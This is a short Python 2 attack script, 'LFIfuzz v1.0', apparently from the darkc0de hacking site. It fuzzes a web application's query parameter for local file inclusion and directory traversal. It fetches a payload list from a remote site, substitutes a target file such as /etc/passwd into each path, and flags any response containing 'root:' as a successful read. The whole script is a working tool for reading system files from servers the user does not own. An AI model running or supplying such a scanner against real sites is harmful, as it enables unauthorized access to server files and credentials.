#!/usr/bin/python
#Takes a list of dir traversal paths and tests http response.
#
##http://www.darkc0de.com
##d3hydr8[at]gmail[dot]com

import sys, httplib, urllib2, socket, time, re

#Search for in source 
#(depends on your file, be creative to limit false positives)
Search = "root:"
#Verbose Mode On = 1
Verbose = 0
#File to use for fuzzing (Don't remove unless changed)
vulns = "http://packetstormsecurity.org/fuzzer/dirTraversal.txt"
#Time to wait between tests (secs)
TTW = "2"

def main(host, path):
	h = httplib.HTTP(host)
	h.putrequest("HEAD", path)
	h.putheader("Host", host)
	h.endheaders()
	okresp, reason, headers = h.getreply()
	return okresp, reason, headers.get("Server")

def getsource(line):
	try:
		source = urllib2.urlopen("http://"+line).read()
		if Verbose == 1:
			print "Source:",len(source)
		if re.search(Search.lower(), source.lower()) != None: 
			print "\n[!] LFI:",line,"\n"
	except(urllib2.HTTPError, urllib2.URLError), msg:
		print "[-] Received Error:",msg
 		pass 

socket.setdefaulttimeout(10)

print "\n\t   d3hydr8[at]gmail[dot]com LFIfuzz v1.0"
print "\t------------------------------------------"

if len(sys.argv) != 3:
	print "\nUsage: ./lfifuzz.py <site> <file>\n"
	print "Ex. ./lfifuzz.py site.com/index.php?id= /etc/passwd\n"
	sys.exit(1)

try:
	paths = urllib2.urlopen(vulns).readlines()[8:]
except(urllib2.HTTPError): 
 	print "[-] Error: Check vulns location.\n" 
	sys.exit(1)
	
host = sys.argv[1].replace("http://","")
if host.count("=") >= 1:
	host = host.rsplit("=",1)[0]+"="
if host[-1:] != "=":
	print "[-] Error: Malformed site address, check example.\n" 
	sys.exit(1)

x = sys.argv[2]
if x[0] == "/" or x[0] == "\'":
	x = x[1:]

okresp, reason, server = main(host.split("/",1)[0],"/")

print "\n[+] Host:",host
print "[+] File:",x
print "[+] Search:",Search
print "[+] Time to wait:",TTW,"seconds"
print "[+] Server:",server
print "[+] Response:",okresp, reason
print "[+] Paths Loaded:",len(paths)
if Verbose == 1:
	print "[+] Verbose Mode On\n"
else:
	print "[+] Verbose Mode Off\n"
	
for line in paths:
	time.sleep(int(TTW))
	line = line.replace("\n","").replace("{FILE}",x)
	if Verbose == 1:
		print "[-] Checking:",line[:-1]
 	getsource(host+line)

print "\n[-] Done\n"
